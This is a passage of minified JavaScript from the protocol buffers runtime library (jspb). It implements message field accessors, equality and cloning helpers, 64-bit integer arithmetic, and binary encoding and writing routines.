                        o[i] = new t(n[i]);
                    e.f[r] = o
                }
            }
            function _e(e) {
                if (e.f)
                    for (var t in e.f) {
                        var r = e.f[t];
                        if (Array.isArray(r))
                            for (var n = 0; n < r.length; n++)
                                r[n] && r[n].g();
                        else
                            r && r.g()
                    }
            }
            function We(e, t) {
                e = e || {},
                t = t || {};
                var r, n = {};
                for (r in e)
                    n[r] = 0;
                for (r in t)
                    n[r] = 0;
                for (r in n)
                    if (!Re(e[r], t[r]))
                        return !1;
                return !0
            }
            function Re(e, t) {
                if (e == t)
                    return !0;
                if (!h(e) || !h(t))
                    return !!("number" === typeof e && isNaN(e) || "number" === typeof t && isNaN(t)) && String(e) == String(t);
                if (e.constructor != t.constructor)
                    return !1;
                if (ge && e.constructor === Uint8Array) {
                    if (e.length != t.length)
                        return !1;
                    for (var r = 0; r < e.length; r++)
                        if (e[r] != t[r])
                            return !1;
                    return !0
                }
                if (e.constructor === Array) {
                    var n = void 0
                      , o = void 0
                      , i = Math.max(e.length, t.length);
                    for (r = 0; r < i; r++) {
                        var s = e[r]
                          , a = t[r];
                        if (s && s.constructor == Object && (b(void 0 === n),
                        b(r === e.length - 1),
                        n = s,
                        s = void 0),
                        a && a.constructor == Object && (b(void 0 === o),
                        b(r === t.length - 1),
                        o = a,
                        a = void 0),
                        !Re(s, a))
                            return !1
                    }
                    return !n && !o || We(n = n || {}, o = o || {})
                }
                if (e.constructor === Object)
                    return We(e, t);
                throw Error("Invalid type in JSPB array")
            }
            function ke(e) {
                return new e.constructor(Me(e.g()))
            }
            function Me(e) {
                if (Array.isArray(e)) {
                    for (var t = Array(e.length), r = 0; r < e.length; r++) {
                        var n = e[r];
                        null != n && (t[r] = "object" == typeof n ? Me(b(n)) : n)
                    }
                    return t
                }
                if (ge && e instanceof Uint8Array)
                    return new Uint8Array(e);
                for (r in t = {},
                e)
                    null != (n = e[r]) && (t[r] = "object" == typeof n ? Me(b(n)) : n);
                return t
            }
            pe.toObjectList = be,
            pe.toObjectExtension = function(e, t, r, n, o) {
                for (var i in r) {
                    var s = r[i]
                      , a = n.call(e, s);
                    if (null != a) {
                        for (var c in s.Ba)
                            if (s.Ba.hasOwnProperty(c))
                                break;
                        t[c] = s.Na ? s.na ? be(a, s.Na, o) : s.Na(o, a) : a
                    }
                }
            }
            ,
            pe.serializeBinaryExtensions = function(e, t, r, n) {
                for (var o in r) {
                    var i = r[o]
                      , s = i.Za;
                    if (!i.Aa)
                        throw Error("Message extension present that was generated without binary serialization support");
                    var a = n.call(e, s);
                    if (null != a)
                        if (s.F()) {
                            if (!i.Wa)
                                throw Error("Message extension present holding submessage without binary support enabled, and message is being serialized to binary format");
                            i.Aa.call(t, s.ma, a, i.Wa)
                        } else
                            i.Aa.call(t, s.ma, a)
                }
            }
            ,
            pe.readBinaryExtension = function(e, t, r, n, o) {
                var i = r[t.c];
                if (i) {
                    if (r = i.Za,
                    !i.za)
                        throw Error("Deserializing extension whose generated code does not support binary format");
                    if (r.F()) {
                        var s = new r.la;
                        i.za.call(t, s, i.Ab)
                    } else
                        s = i.za.call(t);
                    r.na && !i.Nb ? (t = n.call(e, r)) ? t.push(s) : o.call(e, r, [s]) : o.call(e, r, s)
                } else
                    t.C()
            }
            ,
            pe.getField = ve,
            pe.getRepeatedField = function(e, t) {
                return ve(e, t)
            }
            ,
            pe.getOptionalFloatingPointField = we,
            pe.getBooleanField = Te,
            pe.getRepeatedFloatingPointField = function(e, t) {
                var r = ve(e, t);
                if (e.a || (e.a = {}),
                !e.a[t]) {
                    for (var n = 0; n < r.length; n++)
                        r[n] = +r[n];
                    e.a[t] = !0
                }
                return r
            }
            ,
            pe.getRepeatedBooleanField = function(e, t) {
                var r = ve(e, t);
                if (e.a || (e.a = {}),
                !e.a[t]) {
                    for (var n = 0; n < r.length; n++)
                        r[n] = !!r[n];
                    e.a[t] = !0
                }
                return r
            }
            ,
            pe.bytesAsB64 = Ae,
            pe.bytesAsU8 = Ee,
            pe.bytesListAsB64 = function(e) {
                return Pe(e),
                e.length && "string" !== typeof e[0] ? g(e, Ae) : e
            }
            ,
            pe.bytesListAsU8 = function(e) {
                return Pe(e),
                !e.length || e[0]instanceof Uint8Array ? e : g(e, Ee)
            }
            ,
            pe.getFieldWithDefault = Ce,
            pe.getBooleanFieldWithDefault = function(e, t, r) {
                return null == (e = Te(e, t)) ? r : e
            }
            ,
            pe.getFloatingPointFieldWithDefault = function(e, t, r) {
                return null == (e = we(e, t)) ? r : e
            }
            ,
            pe.getFieldProto3 = Ce,
            pe.getMapField = function(e, t, r, n) {
                if (e.f || (e.f = {}),
                t in e.f)
                    return e.f[t];
                var o = ve(e, t);
                if (!o) {
                    if (r)
                        return;
                    Se(e, t, o = [])
                }
                return e.f[t] = new A(o,n)
            }
            ,
            pe.setField = Se,
            pe.setProto3IntField = function(e, t, r) {
                return Ie(e, t, r, 0)
            }
            ,
            pe.setProto3FloatField = function(e, t, r) {
                return Ie(e, t, r, 0)
            }
            ,
            pe.setProto3BooleanField = function(e, t, r) {
                return Ie(e, t, r, !1)
            }
            ,
            pe.setProto3StringField = function(e, t, r) {
                return Ie(e, t, r, "")
            }
            ,
            pe.setProto3BytesField = function(e, t, r) {
                return Ie(e, t, r, "")
            }
            ,
            pe.setProto3EnumField = function(e, t, r) {
                return Ie(e, t, r, 0)
            }
            ,
            pe.setProto3StringIntField = function(e, t, r) {
                return Ie(e, t, r, "0")
            }
            ,
            pe.addToRepeatedField = function(e, t, r, n) {
                return w(e, pe),
                t = ve(e, t),
                void 0 != n ? t.splice(n, 0, r) : t.push(r),
                e
            }
            ,
            pe.setOneofField = Be,
            pe.computeOneofCase = xe,
            pe.getWrapperField = function(e, t, r, n) {
                if (e.f || (e.f = {}),
                !e.f[r]) {
                    var o = ve(e, r);
                    (n || o) && (e.f[r] = new t(o))
                }
                return e.f[r]
            }
            ,
            pe.getRepeatedWrapperField = function(e, t, r) {
                return Oe(e, t, r),
                (t = e.f[r]) == ye && (t = e.f[r] = []),
                t
            }
            ,
            pe.setWrapperField = function(e, t, r) {
                w(e, pe),
                e.f || (e.f = {});
                var n = r ? r.g() : r;
                return e.f[t] = r,
                Se(e, t, n)
            }
            ,
            pe.setOneofWrapperField = function(e, t, r, n) {
                w(e, pe),
                e.f || (e.f = {});
                var o = n ? n.g() : n;
                return e.f[t] = n,
                Be(e, t, r, o)
            }
            ,
            pe.setRepeatedWrapperField = function(e, t, r) {
                w(e, pe),
                e.f || (e.f = {}),
                r = r || [];
                for (var n = [], o = 0; o < r.length; o++)
                    n[o] = r[o].g();
                return e.f[t] = r,
                Se(e, t, n)
            }
            ,
            pe.addToRepeatedWrapperField = function(e, t, r, n, o) {
                Oe(e, n, t);
                var i = e.f[t];
                return i || (i = e.f[t] = []),
                r = r || new n,
                e = ve(e, t),
                void 0 != o ? (i.splice(o, 0, r),
                e.splice(o, 0, r.g())) : (i.push(r),
                e.push(r.g())),
                r
            }
            ,
            pe.toMap = function(e, t, r, n) {
                for (var o = {}, i = 0; i < e.length; i++)
                    o[t.call(e[i])] = r ? r.call(e[i], n, e[i]) : e[i];
                return o
            }
            ,
            pe.prototype.g = function() {
                return _e(this),
                this.u
            }
            ,
            pe.prototype.toArray = pe.prototype.g,
            pe.prototype.toString = function() {
                return _e(this),
                this.u.toString()
            }
            ,
            pe.prototype.getExtension = function(e) {
                if (this.i) {
                    this.f || (this.f = {});
                    var t = e.ma;
                    if (e.na) {
                        if (e.F())
                            return this.f[t] || (this.f[t] = g(this.i[t] || [], (function(t) {
                                return new e.la(t)
                            }
                            ))),
                            this.f[t]
                    } else if (e.F())
                        return !this.f[t] && this.i[t] && (this.f[t] = new e.la(this.i[t])),
                        this.f[t];
                    return this.i[t]
                }
            }
            ,
            pe.prototype.getExtension = pe.prototype.getExtension,
            pe.prototype.Kc = function(e, t) {
                this.f || (this.f = {}),
                me(this);
                var r = e.ma;
                return e.na ? (t = t || [],
                e.F() ? (this.f[r] = t,
                this.i[r] = g(t, (function(e) {
                    return e.g()
                }
                ))) : this.i[r] = t) : e.F() ? (this.f[r] = t,
                this.i[r] = t ? t.g() : t) : this.i[r] = t,
                this
            }
            ,
            pe.prototype.setExtension = pe.prototype.Kc,
            pe.difference = function(e, t) {
                if (!(e instanceof t.constructor))
                    throw Error("Messages have different types.");
                var r = e.g();
                t = t.g();
                var n = []
                  , o = 0
                  , i = r.length > t.length ? r.length : t.length;
                for (e.b && (n[0] = e.b,
                o = 1); o < i; o++)
                    Re(r[o], t[o]) || (n[o] = t[o]);
                return new e.constructor(n)
            }
            ,
            pe.equals = function(e, t) {
                return e == t || !(!e || !t) && e instanceof t.constructor && Re(e.g(), t.g())
            }
            ,
            pe.compareExtensions = We,
            pe.compareFields = Re,
            pe.prototype.Bb = function() {
                return ke(this)
            }
            ,
            pe.prototype.cloneMessage = pe.prototype.Bb,
            pe.prototype.clone = function() {
                return ke(this)
            }
            ,
            pe.prototype.clone = pe.prototype.clone,
            pe.clone = function(e) {
                return ke(e)
            }
            ,
            pe.copyInto = function(e, t) {
                w(e, pe),
                w(t, pe),
                b(e.constructor == t.constructor, "Copy source and target message should have the same type."),
                e = ke(e);
                for (var r = t.g(), n = e.g(), o = r.length = 0; o < n.length; o++)
                    r[o] = n[o];
                t.f = e.f,
                t.i = e.i
            }
            ,
            pe.registerMessageType = function(e, t) {
                t.we = e
            }
            ;
            var Ne = {
                dump: function(e) {
                    return w(e, pe, "jspb.Message instance expected"),
                    b(e.getExtension, "Only unobfuscated and unoptimized compilation modes supported."),
                    Ne.X(e)
                }
            };
            function Fe() {
                this.a = []
            }
            function Ue(e, t) {
                this.lo = e,
                this.hi = t
            }
            function De(e, t) {
                var r = 65535 & e
                  , n = 65535 & t
                  , o = t >>> 16;
                for (t = r * n + 65536 * (r * o & 65535) + 65536 * ((e >>>= 16) * n & 65535),
                r = e * o + (r * o >>> 16) + (e * n >>> 16); 4294967296 <= t; )
                    t -= 4294967296,
                    r += 1;
                return new Ue(t >>> 0,r >>> 0)
            }
            function Le(e) {
                for (var t = new Ue(0,0), r = new Ue(0,0), n = 0; n < e.length; n++) {
                    if ("0" > e[n] || "9" < e[n])
                        return null;
                    r.lo = parseInt(e[n], 10),
                    t = t.eb(10).add(r)
                }
                return t
            }
            function je(e, t) {
                this.lo = e,
                this.hi = t
            }
            function ze(e) {
                var t = 0 < e.length && "-" == e[0];
                return t && (e = e.substring(1)),
                null === (e = Le(e)) ? null : (t && (e = new Ue(0,0).sub(e)),
                new je(e.lo,e.hi))
            }
            function Ve() {
                this.c = [],
                this.b = 0,
                this.a = new Fe,
                this.h = []
            }
            function He(e, t) {
                var r = e.a.end();
                e.c.push(r),
                e.c.push(t),
                e.b += r.length + t.length
            }
            function qe(e, t) {
                return $e(e, t, 2),
                t = e.a.end(),
                e.c.push(t),
                e.b += t.length,
                t.push(e.b),
                t
            }
            function Ge(e, t) {
                var r = t.pop();
                for (b(0 <= (r = e.b + e.a.length() - r)); 127 < r; )
                    t.push(127 & r | 128),
                    r >>>= 7,
                    e.b++;
                t.push(r),
                e.b++
            }
            function $e(e, t, r) {
                b(1 <= t && t == Math.floor(t)),
                e.a.j(8 * t + r)
            }
            function Ke(e, t, r) {
                null != r && ($e(e, t, 0),
                e.a.j(r))
            }
            function Ze(e, t, r) {
                null != r && ($e(e, t, 0),
                e.a.M(r))
            }
            u("jspb.debug.dump", Ne.dump, void 0),
            Ne.X = function(e) {
                var t = d(e);
                if ("number" == t || "string" == t || "boolean" == t || "null" == t || "undefined" == t || "undefined" !== typeof Uint8Array && e instanceof Uint8Array)
                    return e;
                if ("array" == t)
                    return function(e, t, r) {
                        for (var n = [], o = 2; o < arguments.length; ++o)
                            n[o - 2] = arguments[o];
                        Array.isArray(e) || m("Expected array but got %s: %s.", [d(e), e], t, n)
                    }(e),
                    g(e, Ne.X);
                if (e instanceof A) {
                    for (var r = {}, n = (e = e.entries()).next(); !n.done; n = e.next())
                        r[n.value[0]] = Ne.X(n.value[1]);
                    return r
                }
                w(e, pe, "Only messages expected: " + e);
                var o = {
                    $name: (t = e.constructor).name || t.displayName
                };
                for (a in t.prototype) {
                    var i = /^get([A-Z]\w*)/.exec(a);
                    if (i && "getExtension" != a && "getJsPbMessageId" != a) {
                        var s = "has" + i[1];
                        e[s] && !e[s]() || (s = e[a](),
                        o[Ne.$a(i[1])] = Ne.X(s))
                    }
                }
                if (e.extensionObject_)
                    return o.$extensions = "Recursive dumping of extensions not supported in compiled code. Switch to uncompiled or dump extension object directly",
                    o;
                for (n in t.extensions)
                    if (/^\d+$/.test(n)) {
                        s = t.extensions[n];
                        var a = e.getExtension(s);
                        i = void 0,
                        s = s.Ba;
                        var c = []
                          , l = 0;
                        for (i in s)
                            c[l++] = i;
                        i = c[0],
                        null != a && (r || (r = o.$extensions = {}),
                        r[Ne.$a(i)] = Ne.X(a))
                    }
                return o
            }
            ,
            Ne.$a = function(e) {
                return e.replace(/^[A-Z]/, (function(e) {
                    return e.toLowerCase()
                }
                ))
            }
            ,
            u("jspb.BinaryEncoder", Fe, void 0),
            Fe.prototype.length = function() {
                return this.a.length
            }
            ,
            Fe.prototype.length = Fe.prototype.length,
            Fe.prototype.end = function() {
                var e = this.a;
                return this.a = [],
                e
            }
            ,
            Fe.prototype.end = Fe.prototype.end,
            Fe.prototype.l = function(e, t) {
                for (b(e == Math.floor(e)),
                b(t == Math.floor(t)),
                b(0 <= e && 4294967296 > e),
                b(0 <= t && 4294967296 > t); 0 < t || 127 < e; )
                    this.a.push(127 & e | 128),
                    e = (e >>> 7 | t << 25) >>> 0,
                    t >>>= 7;
                this.a.push(e)
            }
            ,
            Fe.prototype.writeSplitVarint64 = Fe.prototype.l,
            Fe.prototype.A = function(e, t) {
                b(e == Math.floor(e)),
                b(t == Math.floor(t)),
                b(0 <= e && 4294967296 > e),
                b(0 <= t && 4294967296 > t),
                this.s(e),
                this.s(t)
            }
            ,
            Fe.prototype.writeSplitFixed64 = Fe.prototype.A,
            Fe.prototype.j = function(e) {
                for (b(e == Math.floor(e)),
                b(0 <= e && 4294967296 > e); 127 < e; )
                    this.a.push(127 & e | 128),
                    e >>>= 7;
                this.a.push(e)
            }
            ,
            Fe.prototype.writeUnsignedVarint32 = Fe.prototype.j,
            Fe.prototype.M = function(e) {
                if (b(e == Math.floor(e)),
                b(-2147483648 <= e && 2147483648 > e),
                0 <= e)
                    this.j(e);
                else {
                    for (var t = 0; 9 > t; t++)
                        this.a.push(127 & e | 128),
                        e >>= 7;
                    this.a.push(1)
                }
            }
            ,
            Fe.prototype.writeSignedVarint32 = Fe.prototype.M,
            Fe.prototype.va = function(e) {
                b(e == Math.floor(e)),
                b(0 <= e && 0x10000000000000000 > e),
                U(e),
                this.l(M, N)
            }
            ,
            Fe.prototype.writeUnsignedVarint64 = Fe.prototype.va,
            Fe.prototype.ua = function(e) {
                b(e == Math.floor(e)),
                b(-0x8000000000000000 <= e && 0x8000000000000000 > e),
                U(e),
                this.l(M, N)
            }
            ,
            Fe.prototype.writeSignedVarint64 = Fe.prototype.ua,
            Fe.prototype.wa = function(e) {
                b(e == Math.floor(e)),
                b(-2147483648 <= e && 2147483648 > e),
                this.j((e << 1 ^ e >> 31) >>> 0)
            }
            ,
            Fe.prototype.writeZigzagVarint32 = Fe.prototype.wa,
            Fe.prototype.xa = function(e) {
                b(e == Math.floor(e)),
                b(-0x8000000000000000 <= e && 0x8000000000000000 > e),
                D(e),
                this.l(M, N)
            }
            ,
            Fe.prototype.writeZigzagVarint64 = Fe.prototype.xa,
            Fe.prototype.Ta = function(e) {
                this.W(ee(e))
            }
            ,
            Fe.prototype.writeZigzagVarint64String = Fe.prototype.Ta,
            Fe.prototype.W = function(e) {
                var t = this;
                z(e),
                q(M, N, (function(e, r) {
                    t.l(e >>> 0, r >>> 0)
                }
                ))
            }
            ,
            Fe.prototype.writeZigzagVarintHash64 = Fe.prototype.W,
            Fe.prototype.be = function(e) {
                b(e == Math.floor(e)),
                b(0 <= e && 256 > e),
                this.a.push(e >>> 0 & 255)
            }
            ,
            Fe.prototype.writeUint8 = Fe.prototype.be,
            Fe.prototype.ae = function(e) {
                b(e == Math.floor(e)),
                b(0 <= e && 65536 > e),
                this.a.push(e >>> 0 & 255),
                this.a.push(e >>> 8 & 255)
            }
            ,
            Fe.prototype.writeUint16 = Fe.prototype.ae,
            Fe.prototype.s = function(e) {
                b(e == Math.floor(e)),
                b(0 <= e && 4294967296 > e),
                this.a.push(e >>> 0 & 255),
                this.a.push(e >>> 8 & 255),
                this.a.push(e >>> 16 & 255),
                this.a.push(e >>> 24 & 255)
            }
            ,
            Fe.prototype.writeUint32 = Fe.prototype.s,
            Fe.prototype.V = function(e) {
                b(e == Math.floor(e)),
                b(0 <= e && 0x10000000000000000 > e),
                F(e),
                this.s(M),
                this.s(N)
            }
            ,
            Fe.prototype.writeUint64 = Fe.prototype.V,
            Fe.prototype.Qc = function(e) {
                b(e == Math.floor(e)),
                b(-128 <= e && 128 > e),
                this.a.push(e >>> 0 & 255)
            }
            ,
            Fe.prototype.writeInt8 = Fe.prototype.Qc,
            Fe.prototype.Pc = function(e) {
                b(e == Math.floor(e)),
                b(-32768 <= e && 32768 > e),
                this.a.push(e >>> 0 & 255),
                this.a.push(e >>> 8 & 255)
            }
            ,
            Fe.prototype.writeInt16 = Fe.prototype.Pc,
            Fe.prototype.S = function(e) {
                b(e == Math.floor(e)),
                b(-2147483648 <= e && 2147483648 > e),
                this.a.push(e >>> 0 & 255),
                this.a.push(e >>> 8 & 255),
                this.a.push(e >>> 16 & 255),
                this.a.push(e >>> 24 & 255)
            }
            ,
            Fe.prototype.writeInt32 = Fe.prototype.S,
            Fe.prototype.T = function(e) {
                b(e == Math.floor(e)),
                b(-0x8000000000000000 <= e && 0x8000000000000000 > e),
                U(e),
                this.A(M, N)
            }
            ,
            Fe.prototype.writeInt64 = Fe.prototype.T,
            Fe.prototype.ka = function(e) {
                b(e == Math.floor(e)),
                b(-0x8000000000000000 <= +e && 0x8000000000000000 > +e),
                z(ee(e)),
                this.A(M, N)
            }
            ,
            Fe.prototype.writeInt64String = Fe.prototype.ka,
            Fe.prototype.L = function(e) {
                b(1 / 0 === e || -1 / 0 === e || isNaN(e) || -34028234663852886e22 <= e && 34028234663852886e22 >= e),
                L(e),
                this.s(M)
            }
            ,
            Fe.prototype.writeFloat = Fe.prototype.L,
            Fe.prototype.J = function(e) {
                b(1 / 0 === e || -1 / 0 === e || isNaN(e) || -17976931348623157e292 <= e && 17976931348623157e292 >= e),
                j(e),
                this.s(M),
                this.s(N)
            }
            ,
            Fe.prototype.writeDouble = Fe.prototype.J,
            Fe.prototype.I = function(e) {
                b("boolean" === typeof e || "number" === typeof e),
                this.a.push(e ? 1 : 0)
            }
            ,
            Fe.prototype.writeBool = Fe.prototype.I,
            Fe.prototype.R = function(e) {
                b(e == Math.floor(e)),
                b(-2147483648 <= e && 2147483648 > e),
                this.M(e)
            }
            ,
            Fe.prototype.writeEnum = Fe.prototype.R,
            Fe.prototype.ja = function(e) {
                this.a.push.apply(this.a, e)
            }
            ,
            Fe.prototype.writeBytes = Fe.prototype.ja,
            Fe.prototype.N = function(e) {
                z(e),
                this.l(M, N)
            }
            ,
            Fe.prototype.writeVarintHash64 = Fe.prototype.N,
            Fe.prototype.K = function(e) {
                z(e),
                this.s(M),
                this.s(N)
            }
            ,
            Fe.prototype.writeFixedHash64 = Fe.prototype.K,
            Fe.prototype.U = function(e) {
                var t = this.a.length;
                !function(e, t, r) {
                    for (var n = [], o = 2; o < arguments.length; ++o)
                        n[o - 2] = arguments[o];
                    "string" !== typeof e && m("Expected string but got %s: %s.", [d(e), e], t, n)
                }(e);
                for (var r = 0; r < e.length; r++) {
                    var n = e.charCodeAt(r);
                    if (128 > n)
                        this.a.push(n);
                    else if (2048 > n)
                        this.a.push(n >> 6 | 192),
                        this.a.push(63 & n | 128);
                    else if (65536 > n)
                        if (55296 <= n && 56319 >= n && r + 1 < e.length) {
                            var o = e.charCodeAt(r + 1);
                            56320 <= o && 57343 >= o && (n = 1024 * (n - 55296) + o - 56320 + 65536,
                            this.a.push(n >> 18 | 240),
                            this.a.push(n >> 12 & 63 | 128),
                            this.a.push(n >> 6 & 63 | 128),
                            this.a.push(63 & n | 128),
                            r++)
                        } else
                            this.a.push(n >> 12 | 224),
                            this.a.push(n >> 6 & 63 | 128),
                            this.a.push(63 & n | 128)
                }
                return this.a.length - t
            }
            ,
            Fe.prototype.writeString = Fe.prototype.U,
            u("jspb.arith.UInt64", Ue, void 0),
            Ue.prototype.cmp = function(e) {
                return this.hi < e.hi || this.hi == e.hi && this.lo < e.lo ? -1 : this.hi == e.hi && this.lo == e.lo ? 0 : 1
            }
            ,
            Ue.prototype.cmp = Ue.prototype.cmp,
            Ue.prototype.La = function() {
                return new Ue((this.lo >>> 1 | (1 & this.hi) << 31) >>> 0,this.hi >>> 1 >>> 0)
            }
            ,
            Ue.prototype.rightShift = Ue.prototype.La,
            Ue.prototype.Da = function() {
                return new Ue(this.lo << 1 >>> 0,(this.hi << 1 | this.lo >>> 31) >>> 0)
            }
            ,
            Ue.prototype.leftShift = Ue.prototype.Da,
            Ue.prototype.cb = function() {
                return !!(2147483648 & this.hi)
            }
            ,
            Ue.prototype.msb = Ue.prototype.cb,
            Ue.prototype.Ob = function() {
                return !!(1 & this.lo)
            }
            ,
            Ue.prototype.lsb = Ue.prototype.Ob,
            Ue.prototype.Ua = function() {
                return 0 == this.lo && 0 == this.hi
            }
            ,
            Ue.prototype.zero = Ue.prototype.Ua,
            Ue.prototype.add = function(e) {
                return new Ue((this.lo + e.lo & 4294967295) >>> 0 >>> 0,((this.hi + e.hi & 4294967295) >>> 0) + (4294967296 <= this.lo + e.lo ? 1 : 0) >>> 0)
            }
            ,
            Ue.prototype.add = Ue.prototype.add,
            Ue.prototype.sub = function(e) {
                return new Ue((this.lo - e.lo & 4294967295) >>> 0 >>> 0,((this.hi - e.hi & 4294967295) >>> 0) - (0 > this.lo - e.lo ? 1 : 0) >>> 0)
            }
            ,
            Ue.prototype.sub = Ue.prototype.sub,
            Ue.mul32x32 = De,
            Ue.prototype.eb = function(e) {
                var t = De(this.lo, e);
                return (e = De(this.hi, e)).hi = e.lo,
                e.lo = 0,
                t.add(e)
            }
            ,
            Ue.prototype.mul = Ue.prototype.eb,
            Ue.prototype.Xa = function(e) {
                if (0 == e)
                    return [];
                var t = new Ue(0,0)
                  , r = new Ue(this.lo,this.hi);
                e = new Ue(e,0);
                for (var n = new Ue(1,0); !e.cb(); )
                    e = e.Da(),
                    n = n.Da();
                for (; !n.Ua(); )
                    0 >= e.cmp(r) && (t = t.add(n),
                    r = r.sub(e)),
                    e = e.La(),
                    n = n.La();
                return [t, r]
            }
            ,
            Ue.prototype.div = Ue.prototype.Xa,
            Ue.prototype.toString = function() {
                for (var e = "", t = this; !t.Ua(); ) {
                    var r = (t = t.Xa(10))[0];
                    e = t[1].lo + e,
                    t = r
                }
                return "" == e && (e = "0"),
                e
            }
            ,
            Ue.prototype.toString = Ue.prototype.toString,
            Ue.fromString = Le,
            Ue.prototype.clone = function() {
                return new Ue(this.lo,this.hi)
            }
            ,
            Ue.prototype.clone = Ue.prototype.clone,
            u("jspb.arith.Int64", je, void 0),
            je.prototype.add = function(e) {
                return new je((this.lo + e.lo & 4294967295) >>> 0 >>> 0,((this.hi + e.hi & 4294967295) >>> 0) + (4294967296 <= this.lo + e.lo ? 1 : 0) >>> 0)
            }
            ,
            je.prototype.add = je.prototype.add,
            je.prototype.sub = function(e) {
                return new je((this.lo - e.lo & 4294967295) >>> 0 >>> 0,((this.hi - e.hi & 4294967295) >>> 0) - (0 > this.lo - e.lo ? 1 : 0) >>> 0)
            }
            ,
            je.prototype.sub = je.prototype.sub,
            je.prototype.clone = function() {
                return new je(this.lo,this.hi)
            }
            ,
            je.prototype.clone = je.prototype.clone,
            je.prototype.toString = function() {
                var e = 0 != (2147483648 & this.hi)
                  , t = new Ue(this.lo,this.hi);
                return e && (t = new Ue(0,0).sub(t)),
                (e ? "-" : "") + t.toString()
            }
            ,
            je.prototype.toString = je.prototype.toString,
            je.fromString = ze,
            u("jspb.BinaryWriter", Ve, void 0),
            Ve.prototype.pb = function(e, t, r) {
                He(this, e.subarray(t, r))
            }
            ,
            Ve.prototype.writeSerializedMessage = Ve.prototype.pb,
            Ve.prototype.Pb = function(e, t, r) {
                null != e && null != t && null != r && this.pb(e, t, r)
            }
            ,
            Ve.prototype.maybeWriteSerializedMessage = Ve.prototype.Pb,
            Ve.prototype.reset = function() {
                this.c = [],
                this.a.end(),
                this.b = 0,
                this.h = []
            }
            ,
            Ve.prototype.reset = Ve.prototype.reset,
            Ve.prototype.ab = function() {
                b(0 == this.h.length);
                for (var e = new Uint8Array(this.b + this.a.length()), t = this.c, r = t.length, n = 0, o = 0; o < r; o++) {
                    var i = t[o];
                    e.set(i, n),
                    n += i.length
                }
                return t = this.a.end(),
                e.set(t, n),
                b((n += t.length) == e.length),
                this.c = [e],
                e
            }
            ,
            Ve.prototype.getResultBuffer = Ve.prototype.ab,
            Ve.prototype.Kb = function(e) {
                return W(this.ab(), e)
            }
            ,
            Ve.prototype.getResultBase64String = Ve.prototype.Kb,
            Ve.prototype.Va = function(e) {
                this.h.push(qe(this, e))
            }
            ,
            Ve.prototype.beginSubMessage = Ve.prototype.Va,
            Ve.prototype.Ya = function() {
                b(0 <= this.h.length),
                Ge(this, this.h.pop())
            }
            ,
            Ve.prototype.endSubMessage = Ve.prototype.Ya,
            Ve.prototype.Nc = function(e, t, r) {
                switch (e) {
                case 1:
                    this.J(t, r);
                    break;
                case 2:
                    this.L(t, r);
                    break;
                case 3:
                    this.T(t, r);
                    break;
                case 4:
                    this.V(t, r);
                    break;
                case 5:
                    this.S(t, r);
                    break;
                case 6:
                    this.Qa(t, r);
                    break;
                case 7:
                    this.Pa(t, r);
                    break;
                case 8:
                    this.I(t, r);
                    break;
                case 9:
                    this.U(t, r);
                    break;
                case 10:
                    v("Group field type not supported in writeAny()");
                    break;
                case 11:
                    v("Message field type not supported in writeAny()");
                    break;
                case 12:
                    this.ja(t, r);
                    break;
                case 13:
                    this.s(t, r);
                    break;
                case 14:
                    this.R(t, r);
                    break;
                case 15:
                    this.Ra(t, r);
                    break;
                case 16:
                    this.Sa(t, r);
                    break;
                case 17:
                    this.rb(t, r);
                    break;
                case 18:
                    this.sb(t, r);
                    break;
                case 30:
                    this.K(t, r);
                    break;
                case 31:
                    this.N(t, r);
                    break;
                default:
                    v("Invalid field type in writeAny()")
                }
            }
            ,
            Ve.prototype.writeAny = Ve.prototype.Nc,
            Ve.prototype.S = function(e, t) {
                null != t && (b(-2147483648 <= t && 2147483648 > t),
                Ze(this, e, t))
            }
            ,
            Ve.prototype.writeInt32 = Ve.prototype.S,
            Ve.prototype.ob = function(e, t) {
                null != t && (b(-2147483648 <= (t = parseInt(t, 10)) && 2147483648 > t),
                Ze(this, e, t))
            }
            ,
            Ve.prototype.writeInt32String = Ve.prototype.ob,
            Ve.prototype.T = function(e, t) {
                null != t && (b(-0x8000000000000000 <= t && 0x8000000000000000 > t),
                null != t && ($e(this, e, 0),
                this.a.ua(t)))
            }
            ,
            Ve.prototype.writeInt64 = Ve.prototype.T,
            Ve.prototype.ka = function(e, t) {
                null != t && (t = ze(t),
                $e(this, e, 0),
                this.a.l(t.lo, t.hi))
            }
            ,
            Ve.prototype.writeInt64String = Ve.prototype.ka,
            Ve.prototype.s = function(e, t) {
                null != t && (b(0 <= t && 4294967296 > t),
                Ke(this, e, t))
            }
            ,
            Ve.prototype.writeUint32 = Ve.prototype.s,
            Ve.prototype.ub = function(e, t) {
                null != t && (b(0 <= (t = parseInt(t, 10)) && 4294967296 > t),
                Ke(this, e, t))
            }
            ,
            Ve.prototype.writeUint32String = Ve.prototype.ub,
            Ve.prototype.V = function(e, t) {
                null != t && (b(0 <= t && 0x10000000000000000 > t),
                null != t && ($e(this, e, 0),
                this.a.va(t)))
            }
            ,
            Ve.prototype.writeUint64 = Ve.prototype.V,
            Ve.prototype.vb = function(e, t) {
                null != t && (t = Le(t),
                $e(this, e, 0),
                this.a.l(t.lo, t.hi))
            }
            ,
            Ve.prototype.writeUint64String = Ve.prototype.vb,
            Ve.prototype.rb = function(e, t) {
                null != t && (b(-2147483648 <= t && 2147483648 > t),
                null != t && ($e(this, e, 0),
                this.a.wa(t)))
            }
            ,
            Ve.prototype.writeSint32 = Ve.prototype.rb,
            Ve.prototype.sb = function(e, t) {
                null != t && (b(-0x8000000000000000 <= t && 0x8000000000000000 > t),
                null != t && ($e(this, e, 0),
                this.a.xa(t)))
            }
            ,
            Ve.prototype.writeSint64 = Ve.prototype.sb,
            Ve.prototype.$d = function(e, t) {
                null != t && null != t && ($e(this, e, 0),
                this.a.W(t))
            }
            ,
            Ve.prototype.writeSintHash64 = Ve.prototype.$d,
            Ve.prototype.Zd = function(e, t) {
                null != t && null != t && ($e(this, e, 0),
                this.a.Ta(t))
            }
            ,
            Ve.prototype.writeSint64String = Ve.prototype.Zd,
            Ve.prototype.Pa = function(e, t) {
                null != t && (b(0 <= t && 4294967296 > t),
                $e(this, e, 5),
                this.a.s(t))
            }
            ,
            Ve.prototype.writeFixed32 = Ve.prototype.Pa,
            Ve.prototype.Qa = function(e, t) {
                null != t && (b(0 <= t && 0x10000000000000000 > t),
                $e(this, e, 1),
                this.a.V(t))
            }
            ,
            Ve.prototype.writeFixed64 = Ve.prototype.Qa,
            Ve.prototype.nb = function(e, t) {
                null != t && (t = Le(t),
                $e(this, e, 1),
                this.a.A(t.lo, t.hi))
            }
            ,
